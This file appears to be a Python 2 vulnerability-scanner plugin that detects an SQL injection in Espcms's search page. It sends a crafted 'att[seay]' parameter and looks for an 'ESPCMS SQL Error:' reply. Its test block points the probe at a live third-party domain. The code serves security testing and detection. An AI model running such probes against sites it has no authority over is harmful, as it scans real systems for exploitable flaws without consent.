#!/usr/bin/python2.7
#coding:utf-8

import requests
from dummy import *

info = {
	'NAME':'Espcms Search SQL Injection',
	'AUTHOR':'seay,yangbh',
	'TIME':'20140811',
	'WEB':'',
	'DESCRIPTION':'Via: http://blog.163.com/j8g_/blog/static/217780396201321312334801/'
}
opts = {
	'url':'http://testasp.vulnweb.com',	#'target ip'
}
# opts = [
# 	['url','http://testasp.vulnweb.com','target url'],
# ]

def Assign(services):
	if services.has_key('url') and services.has_key('cms'):
		if services['cms'] == 'Espcms':
			return True
	return False

def Audit(services):
	url = services['url'] + '/index.php?ac=search&at=list&att[seay]=bugscan'
	try:
		rqu = requests.get(url)
		if rqu.status_code == 200 and rqu.text.find('ESPCMS SQL Error:') != -1:
			security_note(url)
	except:
		pass
# ----------------------------------------------------------------------------------------------------
#	untest yet
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__':
	services = {'url':'http://www.eguan.cn'}
	pprint(Audit(services))
	pprint(services)